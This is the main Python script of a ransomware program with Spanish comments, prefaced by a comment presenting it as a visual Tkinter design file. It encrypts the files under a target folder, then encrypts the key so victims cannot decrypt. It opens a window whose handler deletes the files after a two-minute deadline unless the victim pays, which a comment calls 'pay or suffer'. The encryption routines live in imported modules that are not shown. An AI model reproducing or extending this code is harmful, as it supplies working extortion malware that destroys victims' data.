# Designed with https://visualtkinter.com - paste this file into File > Import there to edit it visually
import os
import sys
import tkinter as tk
from datetime import datetime, timedelta
from algorithm import get_files
from ransomware import Ransomware
from handler import Handler
from interface import Main


#nonce = os.urandom(12)
CURRENT_PATH = os.path.dirname(os.path.abspath(sys.argv[0]))
TIME_TO_DELETE = 2 # Minutos

routes = get_files("./ruta")

fecha_objetivo = datetime.now() + timedelta(minutes=TIME_TO_DELETE)


ransomware = Ransomware()

# Cifrando
def cifrar_directorios():
   for r in routes:
    ruta_completa = os.path.join(CURRENT_PATH, r)
    ransomware.cifrar_archivo(ruta_completa)

def descifrar_directorios():
   for r in routes:
    ruta_completa = os.path.join(CURRENT_PATH, r)
    ransomware.descifrar_archivo(ruta_completa)

def eliminar_archivos():
    for r in routes:
      ruta_completa = os.path.join(CURRENT_PATH, r)
      ransomware.eliminar_datos(ruta_completa)

def descifrar_llave(key):
  ransomware.descifrar_llave(key)

if __name__ == "__main__":
    # Iniciamos cifrando los directorios
    cifrar_directorios()

    # Luego ciframos la llave para evitar que los desencripten
    ransomware.cifrar_llave()

    # Con la llave cifrada ahora el usuario tiene que pagar o sufrir
    handler = Handler(fecha_objetivo, eliminar_archivos, descifrar_directorios, descifrar_llave)
    root = tk.Tk()
    app = Main(root, handler)
    root.mainloop()
